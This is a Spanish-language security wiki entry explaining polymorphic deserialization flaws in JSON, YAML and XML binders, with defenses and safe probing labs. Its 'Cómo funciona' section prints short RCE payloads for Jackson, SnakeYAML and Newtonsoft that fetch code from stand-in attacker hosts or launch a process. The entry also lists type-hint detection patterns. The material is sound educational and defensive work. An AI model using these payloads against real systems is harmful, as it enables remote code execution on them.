# Polymorphic Deserialization

## Definición

La deserialización polimórfica es la misma clase de vulnerabilidad que la [[deserialization|deserialización insegura]] nativa — reintroducida a través de librerías de binding de JSON, XML, y YAML que instancian clases elegidas en runtime desde type hints controlados por el atacante en los datos. El formato de wire es texto plano y parece inerte; la *librería de binding* es el parser-como-motor-de-ejecución.

## Por qué importa

Los equipos de API adoptaron JSON específicamente para escapar de las vulnerabilidades de serialización Java/PHP — y las reintrodujeron a través de la configuración del binder. Esto importa porque:

- **El riesgo es invisible en la capa de datos.** Los revisores que leen el cuerpo de un request JSON ven strings, números, y arrays. No ven que Jackson está configurado con `enableDefaultTyping()` e instanciará una clase nombrada en `["com.example.Bad", {...}]`. La reputación de JSON como formato seguro activamente engaña el threat modeling.
- **Es el vector de deserialización dominante en stacks modernos.** La serialización nativa Java/PHP es rara en codebases greenfield de los 2020s. Jackson, Gson, Newtonsoft Json.NET, y SnakeYAML están en todos lados — y un binder polimórfico mal configurado produce el mismo primitivo de RCE.
- **Las defensas no son por defecto.** Tanto Jackson como Newtonsoft tienen defaults seguros *ahora*, pero habilitar el polimorfismo está a una anotación o un flag de constructor de distancia. SnakeYAML requiere opt-in explícito a `SafeConstructor`. Las apps escritas contra docs viejos, o apps que importaron un tutorial que "funcionó", usualmente son inseguras.
- **Enseña la lección de formato-de-datos-vs-binder.** La vulnerabilidad no está en JSON. La vulnerabilidad está en la lógica de instanciación que elige clases basándose en hints provistos por el atacante. La misma lección aplica cada vez que un parser realiza construcción reflexiva.

## Cómo funciona

Cuatro condiciones deben ser verdaderas para que la vulnerabilidad se active:

1. **El binder reconstruye objetos tipados con hints de nombre de clase de los datos.** Ejemplos:
   - Jackson `@JsonTypeInfo(use = Id.CLASS)` o global `enableDefaultTyping()`
   - Newtonsoft Json.NET `TypeNameHandling.All` / `TypeNameHandling.Auto`
   - Gson campo tipado `Object` más un adaptador personalizado que acepta nombres de clase
   - SnakeYAML `Constructor` por defecto (instancia cualquier clase nombrada en tags `!!java.example.Foo`)
   - XStream — patrón similar en XML
2. **El polimorfismo está habilitado globalmente o en el campo objetivo.**
3. **No hay un allowlist de clases configurado.** Jackson moderno soporta `BasicPolymorphicTypeValidator`, Newtonsoft soporta `SerializationBinder`, SnakeYAML soporta `SafeConstructor`. Ninguno está activo por defecto en configuraciones legacy.
4. **Un gadget en el classpath.** Los [[gadget-chains|gadget chains]] publicados en `marshalsec` y `ysoserial` para Spring, Hibernate, JNDI, ROME, etc. cubren la mayoría de los árboles de dependencias enterprise.

Ejemplo concreto de Jackson (config legacy `enableDefaultTyping()`):

```
[
  "org.springframework.context.support.ClassPathXmlApplicationContext",
  "http://attacker.example/exploit.xml"
]
```

Jackson ve el array de dos elementos, trata el elemento 0 como el nombre de clase, instancia `ClassPathXmlApplicationContext` con el elemento 1 como argumento del constructor. Ese constructor busca la URL, la parsea como una definición de bean Spring, y la definición de bean Spring contiene un `ObjectFactory` que ejecuta un comando. RCE sin nunca llamar a `unserialize` o `readObject`.

Ejemplo concreto de SnakeYAML:

```
!!javax.script.ScriptEngineManager
- !!java.net.URLClassLoader
  - - !!java.net.URL ["http://attacker/x.jar"]
```

El constructor por defecto de SnakeYAML instancia `URLClassLoader` apuntando a un JAR controlado por el atacante, luego instancia `ScriptEngineManager` contra ese loader — que carga y ejecuta la entrada `META-INF/services` del JAR. RCE a través de un parse YAML.

Ejemplo concreto de Newtonsoft (`TypeNameHandling.All`):

```
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": { "$type": "...", "FileName": "calc.exe", "Arguments": "" }
  }
}
```

La forma del bug es idéntica en todos los ejemplos: los datos nombran una clase, el binder la construye, el constructor (o equivalente de magic-method) hace algo peligroso con el estado controlado. Es el mismo modelo mental de gadget chain de [[gadget-chains]], solo kickeado a través de un binder JSON/YAML/XML en lugar de `readObject`.

## Técnicas / patrones

Qué miran los atacantes y cómo sondean:

- **Identificar la librería de binding por nombres de clase de error.** Un endpoint Jackson mal configurado con páginas de error verbosas filtra `com.fasterxml.jackson.databind.JsonMappingException`. SnakeYAML filtra `org.yaml.snakeyaml.constructor.ConstructorException`. Newtonsoft filtra `Newtonsoft.Json.JsonReaderException`.
- **Sondear con formas de type-hint, no con payloads.** Enviar `["nonexistent.Class", {}]` (forma de Jackson default-typing) o `{"$type":"x.y","value":1}` (forma Newtonsoft) o `!!java.lang.String` (forma SnakeYAML). Un error *diferente* al de mismatch de tipo ordinario (ej: `ClassNotFoundException`) confirma que el binder está dispuesto a resolver nombres de clase del atacante.
- **Verificar el classpath vía filtración de dependencias.** Los endpoints `/actuator` de Spring Boot, `pom.xml` de Maven en source maps, stack traces de error con FQDNs de librerías, y hasta response headers (`X-Powered-By`) ayudan a determinar qué catálogo de gadgets usar.
- **Usar `marshalsec` y `ysoserial.net`.** Ambos incluyen generadores de payload para binder polimórfico específicamente para Jackson, SnakeYAML, JSON-IO, FastJSON, XStream, Newtonsoft.
- **Recaer en sondeos ciegos.** Cualquier payload referenciando una URL que el atacante controla (`URLClassLoader`, `JdbcRowSetImpl + JNDI` para Jackson) es una sonda universal "¿honró el binder mi hint de clase?" Detectar vía DNS/HTTP de salida.

## Variantes y bypasses

### Jackson FasterXML

- **Default typing habilitado globalmente** (`ObjectMapper.enableDefaultTyping()`) — el clásico punto de apoyo; deprecado desde 2.10 pero todavía amplio en código legacy.
- **`@JsonTypeInfo(use = Id.CLASS)` en un campo polimórfico** — superficie de ataque más estrecha pero todavía activa si el campo está en un DTO de request.
- **CVEs famosos:** CVE-2017-7525, CVE-2017-15095, CVE-2019-12384, CVE-2019-14439, decenas más en la historia de CVEs de FasterXML.
- **Path seguro moderno:** deshabilitar el default typing completamente, o usar `BasicPolymorphicTypeValidator.builder().allowIfBaseType(...)` con un allowlist explícito de subclases.

### Gson

- Generalmente más seguro porque Gson no honra hints de nombre de clase por defecto.
- **Superficie de riesgo:** campos tipados `Object` combinados con un `JsonDeserializer` personalizado que lee un campo `type` y hace `Class.forName`. La vulnerabilidad está en el adaptador de la aplicación, no en Gson.
- **`RuntimeTypeAdapterFactory`** es el mecanismo polimórfico recomendado y es seguro cuando se configura con una lista explícita de subclases.

### Newtonsoft Json.NET (.NET)

- **`TypeNameHandling.All` / `TypeNameHandling.Auto`** — las configuraciones inseguras. Documentadas como "no usar con datos no confiables" desde 2018, pero apps legacy y tutoriales todavía lo habilitan.
- El discriminador **`$type`** es el indicador en el wire.
- **Cadenas famosas:** `ObjectDataProvider`, `WindowsIdentity`, `System.Configuration.Install.AssemblyInstaller`. ysoserial.NET cataloga el conjunto completo.
- **Path seguro moderno:** `TypeNameHandling.None` (el default) más un `SerializationBinder` que allowlistea tipos conocidos cuando el polimorfismo es requerido.

### SnakeYAML (Java)

- **El `Constructor` por defecto instancia cualquier cosa.** El comportamiento *por defecto* de la librería es inseguro; la seguridad es opt-in vía `new Yaml(new SafeConstructor())`.
- **CVE-2022-1471** rastreó el comportamiento del constructor por defecto de larga data; SnakeYAML 2.0 (2023) cambió los defaults.
- **Path seguro moderno:** siempre pasar `SafeConstructor` explícitamente, o usar el módulo YAML de Jackson con los mismos patrones de allowlist que JSON.

### XStream

- **El comportamiento por defecto confía en nombres de clase en XML.** Múltiples CVEs de alto impacto (CVE-2017-9805 para Apache Struts2, CVE-2021-21345, etc.).
- **Path seguro moderno:** XStream 1.4.18+ requiere allowlists explícitos vía `xStream.allowTypes(...)`.

### FastJSON (Alibaba Fastjson, Java)

- Específico de ecosistemas chinos pero distribuido globalmente vía Maven Central.
- **Feature `autoType`** — el mismo problema de default-typing; múltiples CVEs entre 2017–2022.
- **Path seguro moderno:** Fastjson 2.x con autoType deshabilitado o allowlist estricto.

### YAML en ecosistemas no-Java

- **PyYAML** `yaml.load()` sin `Loader=SafeLoader` — equivalente Python de SnakeYAML.
- **Ruby Psych** ha tenido problemas similares; versiones modernas seguras por defecto.

## Impacto

La severidad coincide con la fuerza del gadget chain alcanzable en el classpath:

- **Remote code execution** — techo típico.
- **Server-side request forgery** — cadenas vía `URL.openStream` o lookups JNDI (`JdbcRowSetImpl`).
- **Lectura / escritura de archivo local** — cadenas alcanzando APIs del filesystem.
- **Bypass de autenticación** — cuando el polimorfismo le permite al atacante sustituir un `AdminPrincipal` por un `UserPrincipal` directamente en la sesión deserializada.
- **Carga de clase desde URLs controladas por el atacante** — el path JNDI / `URLClassLoader` es su propia clase de impacto.

Los servicios de API frecuentemente corren con credenciales de base de datos elevadas y acceso a redes internas, elevando la severidad práctica más allá de lo que sugiere el rol de usuario del frontend.

## Detección y defensa

Ordenado por efectividad:

1.
**Deshabilitar la deserialización polimórfica a menos que el schema lo requiera.**
   La postura por defecto para una API: cada DTO es una clase concreta con campos concretos. Sin campos tipados `Object`, sin `@JsonTypeInfo`, sin `enableDefaultTyping`, sin constructor por defecto de SnakeYAML. Si el binder no puede construir clases nombradas por el atacante, toda la clase de vulnerabilidad desaparece.

2.
**Cuando el polimorfismo es requerido, aplicar un allowlist de clases en el binder.**
   Jackson `BasicPolymorphicTypeValidator.builder().allowIfBaseType(MyBase.class).build()`. Newtonsoft `SerializationBinder` devolviendo `null` para todo lo que no esté en la lista. SnakeYAML `SafeConstructor`, luego capas de tags específicos. El allowlist es corto, explícito, y revisado cuando cambia.

3.
**Pinar a una versión del binder con defaults seguros.**
   Jackson 2.10+, Newtonsoft 12+, SnakeYAML 2.0+, XStream 1.4.18+. Cada uno tuvo una release que cambió un default peligroso. Las apps viejas pinadas a versiones viejas retienen silenciosamente la vulnerabilidad incluso después de que el codebase se "actualiza."

4.
**Validar el schema antes de bindear.**
   Usar un validador JSON Schema / OpenAPI separado que corre sobre el cuerpo raw del request antes de que el binder lo vea. Cualquier campo que lleve una clave de type-hint (`$type`, `@class`, etc.) que no está declarada en el schema es rechazado.

5.
**Eliminar cadenas peligrosas del árbol de dependencias donde sea factible.**
   Defensa en profundidad, no defensa primaria. Remover C3P0 / Hibernate / Spring beans / `JdbcRowSetImpl` de un servicio que no los necesita reduce la superficie de gadget pero no elimina la clase.

6.
**Monitorear tráfico de entrada por patrones de type-hint.**
   `$type`, `@class`, `!!java.`, `!!python/`, `["fully.qualified.ClassName"` — cualquiera de estos en un cuerpo de request donde nunca se esperaban es señal de alta intensidad.

### Qué no funciona como defensa primaria

- **"Usamos JSON, no serialización Java."** Los binders polimórficos son el Caballo de Troya. JSON son datos; Jackson con default typing es ejecución.
- **Validar después del binding.** Mismo problema que la deserialización nativa: el constructor / setter / `@JsonCreator` ya corrió.
- **Confiar en settings por defecto sin verificar la versión.** Jackson 2.9 con `enableDefaultTyping()` es inseguro aunque el default de Jackson 2.10 sea seguro.
- **Remover uno o dos gadgets nombrados.** Misma lección que la deserialización nativa. El catálogo de cadenas crece.
- **Solo firmas WAF.** Trivialmente bypasseable vía escapes Unicode, base64, órdenes alternativas de propiedades, y gadgets no catalogados.

## Labs prácticos

Usar solo labs locales, targets deliberadamente vulnerables, o sistemas con permiso explícito.

### Identificar fingerprints del binder desde errores seguros

```
curl -i -X POST -H 'Content-Type: application/json' \
  -d '{"$type":"example.DoesNotExist","value":1}' \
  https://api.example.test/import
```

Buscar errores específicos de librería como nombres de clase de Jackson, Newtonsoft, SnakeYAML, FastJSON, o XStream. Un error del tipo `ClassNotFoundException` es una señal fuerte de que el binder intentó resolver un type hint.

### Buscar polimorfismo inseguro en código

```
rg -n "enableDefaultTyping|@JsonTypeInfo|TypeNameHandling|SerializationBinder|new Yaml\\(|yaml\\.load|autoType|XStream" src
```

Revisar cada match como una decisión de límite de confianza: qué endpoint recibe los datos, qué tipos están permitidos, y si el input no confiable alcanza el binder.

### Sondear límites del schema declarado

```
curl -i -X POST -H 'Content-Type: application/json' \
  -d '{"name":"test","@class":"example.DoesNotExist","$type":"example.DoesNotExist"}' \
  https://api.example.test/configs
```

Los endpoints que no declaran campos de type-hint deben rechazarlos antes del binding.

### Verificar carga YAML segura en un fixture local

```
rg -n "SafeConstructor|SafeLoader|FullLoader|Constructor" src config
```

Los parsers YAML merecen el mismo escrutinio que los binders JSON porque los tags YAML pueden disparar la construcción de objetos.

## Ejemplos prácticos

- Un servicio Spring Boot con `objectMapper.enableDefaultTyping()` en un endpoint POST público — payload establece una URL de Spring `ClassPathXmlApplicationContext`, RCE.
- Una API .NET ASP.NET usando `TypeNameHandling.All` "por conveniencia" en un endpoint admin — payload `ObjectDataProvider` de ysoserial.NET, RCE.
- Un config-loader Java usando SnakeYAML `new Yaml().load(stream)` en `application.yaml` cuya ubicación está influenciada por una variable de entorno — RCE en startup si el atacante puede escribir en el path de config.
- Un servidor Python ML usando `yaml.load()` (loader por defecto) en configs de experimento subidos — RCE equivalente a pickle a través de `!!python/object/apply:`.
- Un microservicio moderno con `@JsonTypeInfo(use = Id.CLASS)` en un único campo y sin `BasicPolymorphicTypeValidator` — superficie de ataque estrecha pero todavía RCE si existe un gadget en el árbol de dependencias.
- Un endpoint GraphQL con un scalar `JSON` que round-tripea a través de Jackson con default typing — inyección de polimorfismo a través del escape hatch del schema.

## Notas relacionadas

- [[deserialization|Insecure deserialization]] — clase de vulnerabilidad padre.
- [[gadget-chains|Gadget chains]] — misma forma de cadena, diferente mecanismo de kick-off.
- [[mass-assignment]] — adyacente: el framework instancia campos controlados por el atacante.
- [[jwt-attacks]] — adyacente: los datos del cliente en forma estructurada se bindean a claims tipados.
- [[broken-object-property-level-authorization]] — adyacente: cuando el polimorfismo le permite al atacante sustituir una subclase privilegiada en un DTO de request.
- [[api-security-top-10]] — se ubica bajo API8:2023 *Security Misconfiguration* en el OWASP API Top 10 moderno.

## Referencias

- **Fundamental:** OWASP Deserialization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- **Fundamental:** OWASP API8:2023 Security Misconfiguration — https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/
- **Testing / Lab:** PortSwigger Exploiting insecure deserialization — https://portswigger.net/web-security/deserialization/exploiting
- **Investigación / Deep Dive:** Moritz Bechler, "Java Unmarshaller Security" (`marshalsec`) — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf
- **Docs Oficiales:** ysoserial.net — https://github.com/pwntester/ysoserial.net
